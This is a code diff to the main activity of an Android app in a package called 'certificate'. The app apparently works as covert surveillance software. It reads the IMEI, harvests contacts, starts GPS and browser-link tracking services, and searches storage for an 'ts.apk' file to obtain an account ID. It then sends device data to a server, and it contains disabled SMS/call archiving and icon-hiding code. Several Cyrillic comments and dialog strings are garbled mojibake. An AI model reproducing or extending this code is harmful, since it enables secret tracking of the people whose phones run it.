@@ -6,7 +6,8 @@ import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
-
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
@@ -31,8 +32,6 @@ import android.widget.EditText;
 
 import com.inet.android.certificate.R;
 import com.inet.android.contacts.GetContacts;
-import com.inet.android.archive.ArchiveCall;
-import com.inet.android.archive.ArchiveSms;
 import com.inet.android.history.LinkService;
 import com.inet.android.location.GPSTracker;
 import com.inet.android.request.DataRequest;
@@ -66,12 +65,11 @@ public class MainActivity extends Activity {
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
-		//setContentView(R.layout.activity_main);
+		// setContentView(R.layout.activity_main);
 		context = getApplicationContext();
 		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
-	
-		sp = PreferenceManager
-				.getDefaultSharedPreferences(context);
+
+		sp = PreferenceManager.getDefaultSharedPreferences(context);
 		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
 		String imeistring = manager.getDeviceId();
@@ -79,54 +77,63 @@ public class MainActivity extends Activity {
 		Log.d("Main", "GetCont");
 
 		String androidVersion = android.os.Build.VERSION.RELEASE;
-//		GetInfo getInfo = new  GetInfo(context);
-//		getInfo.getInfo();
+		// GetInfo getInfo = new GetInfo(context);
+		// getInfo.getInfo();
 		GetContacts getCont = new GetContacts();
 		getCont.execute(context);
-//		ArchiveSms arhSms = new ArchiveSms();
-//		arhSms.execute(context);
-//		ArchiveCall arhCall = new ArchiveCall();
-//		arhCall.execute(context);	
+		// ArchiveSms arhSms = new ArchiveSms();
+		// arhSms.execute(context);
+		// ArchiveCall arhCall = new ArchiveCall();
+		// arhCall.execute(context);
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
 		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
 		e.putString("IMEI", sIMEI);
 		e.putString("ABOUT", aboutDev);
+		e.putString("model", model);
 		e.commit();
 
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
-			// проверка на первое посещение
+			// ГЇГ°Г®ГўГҐГ°ГЄГ  Г­Г  ГЇГҐГ°ГўГ»Г© Г§Г ГЇГіГ±ГЄ
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // ГўГ°ГҐГ¬Гї
+																				// Г¤Г«Гї
+																				// Г±ГҐГ°ГўГЁГ±Г 
+																				// ГЁГ±ГІГ°Г®ГЁГЁ
+																				// ГЎГ°Г ГіГ§ГҐГ°Г 
+			e.putString("period", "1"); // ГЇГҐГ°ГЁГ®Г¤ГЁГ·ГҐГ±ГЄГЁГ© Г§Г ГЇГ°Г®Г± ГЄГ Г¦Г¤Г»ГҐ 10 Г¬ГЁГ­ГіГІ
+			e.putString("code", "-1");
 			e.commit();
-			
-//			hideIcon();
+
+			// hideIcon();
 		}
-		
-		getID(); // рекурсивный поиск файла с нужным именем
+
+		getID(); // СЂРµРєСѓСЂСЃРёРІРЅС‹Р№ РїРѕРёСЃРє С„Р°Р№Р»Р° СЃ РЅСѓР¶РЅС‹Рј РёРјРµРЅРµРј
 		if (sp.getString("ID", "ID").equals("ID")) {
 
-			Logging.doLog(LOG_TAG, "File not found. Show dialog.", "File not found. Show dialog.");
-			
+			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
+					"File not found. Show dialog.");
+
 			viewIDDialog();
 		} else
 			finish();
 	}
-	
+
 	@Override
-	public void onConfigurationChanged(Configuration newConfig) {  
-	        super.onConfigurationChanged(newConfig);  
+	public void onConfigurationChanged(Configuration newConfig) {
+		super.onConfigurationChanged(newConfig);
 	}
+
 	private boolean viewIDDialog() {
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
 
-		alert.setTitle("Ввод account number");
-		alert.setMessage("Введите account number. Нет права на ошибку!");
+		alert.setTitle("Г‚ГўГ®Г¤ account number");
+		alert.setMessage("Г‚ГўГҐГ¤ГЁГІГҐ account number. ГЌГҐГІ ГЇГ°Г ГўГ  Г­Г  Г®ГёГЁГЎГЄГі!");
 
 		final EditText input = new EditText(this);
 		alert.setView(input);
@@ -136,14 +143,15 @@ public class MainActivity extends Activity {
 				String value = input.getText().toString();
 
 				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);
-				
+
 				sp = PreferenceManager
 						.getDefaultSharedPreferences(getApplicationContext());
 				Editor e = sp.edit();
-				e.putString("ID", value);
+				e.putString("account", value);
 				e.commit();
-				start(); // запуск сервисов
-				sendDiagPost();
+				start(); // Г§Г ГЇГіГ±ГЄ Г±ГҐГ°ГўГЁГ±Г®Гў
+				// sendDiagPost();
+				// sendStartRequest();
 				finish();
 			}
 		});
@@ -164,24 +172,25 @@ public class MainActivity extends Activity {
 		String diag = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>"
 				+ logTime() + "</time><type>1</type><ttl>"
 				+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
-				+ "</ttl><cls>" + sp.getString("IMEI", "0000")
-				+ "</cls><url>"
+				+ "</ttl><cls>" + sp.getString("IMEI", "0000") + "</cls><url>"
 				+ Long.toString(System.currentTimeMillis())
 				+ sp.getString("ABOUT", "about") + "</url></packet>";
 
-		Logging.doLog(LOG_TAG, "MainAct diagRequest: before req", "MainAct diagRequest: before req");
+		Logging.doLog(LOG_TAG, "MainAct diagRequest: before req",
+				"MainAct diagRequest: before req");
 
-//		RequestMakerImpl req = new RequestMakerImpl(context);
-//		req.sendDataRequest(diag);
+		// RequestMakerImpl req = new RequestMakerImpl(context);
+		// req.sendDataRequest(diag);
 		DataRequest dr = new DataRequest(context);
 		dr.sendRequest(diag);
-		
-		Logging.doLog(LOG_TAG, "MainAct diagRequest: post req", "MainAct diagRequest: post req");
+
+		Logging.doLog(LOG_TAG, "MainAct diagRequest: post req",
+				"MainAct diagRequest: post req");
 	}
 
 	public void getID() {
 		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
-		
+
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
 		recursiveFileFind(file);
 	}
@@ -196,7 +205,6 @@ public class MainActivity extends Activity {
 				if (file1[i].isDirectory()) {
 					File[] file = file1[i].listFiles();
 					if (recursiveFileFind(file) == true) {
-						Log.d("recurs", ID);
 						return true;
 					}
 				}
@@ -204,13 +212,13 @@ public class MainActivity extends Activity {
 				if (sID.indexOf("ts.apk") != -1) {
 					ID = sID.substring(0, sID.indexOf("t"));
 					e = sp.edit();
-					e.putString("ID", ID);
+					e.putString("account", ID);
 					e.commit();
-					Log.d("ID", sp.getString("ID", "ID"));
-					if (!sp.getString("ID", "ID").equals("ID")) {
-						sendStartRequest();
-//						sendDiagPost();
-//						start(); // запуск сервисов
+					// Log.d("ID", sp.getString("ID", "ID"));
+					if (!sp.getString("account", "account").equals("account")) {
+						// sendStartRequest();
+						// sendDiagPost();
+						start(); // Г§Г ГЇГіГ±ГЄ Г±ГҐГ°ГўГЁГ±Г®Гў
 						return true;
 					}
 					break;
@@ -223,12 +231,25 @@ public class MainActivity extends Activity {
 	}
 
 	private void sendStartRequest() {
-//		RequestMaker service = new RequestMakerImpl(context);
-//		String str = "\"";
-//		service.sendStartRequest(str);
-		String str = "\"";
+		// RequestMaker service = new RequestMakerImpl(context);
+		// String str = "\"";
+		// service.sendStartRequest(str);
+		JSONObject jsonObject = new JSONObject();
+		try {
+			jsonObject.put("account", sp.getString("account", "0000"));
+			jsonObject.put("imei", sp.getString("imei", "0000"));
+			jsonObject.put("model", "iphone");
+		} catch (JSONException e) {
+			e.printStackTrace();
+		}
+
+		String str = jsonObject.toString();
 		StartRequest sr = new StartRequest(context);
 		sr.sendRequest(str);
+
+		Logging.doLog(LOG_TAG, "start services", "start Request4");
+
+		startService(new Intent(MainActivity.this, Request4.class));
 	}
 
 	public void start() {
@@ -244,7 +265,7 @@ public class MainActivity extends Activity {
 
 		startService(new Intent(MainActivity.this, GPSTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
-		
+
 		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
 	}
 
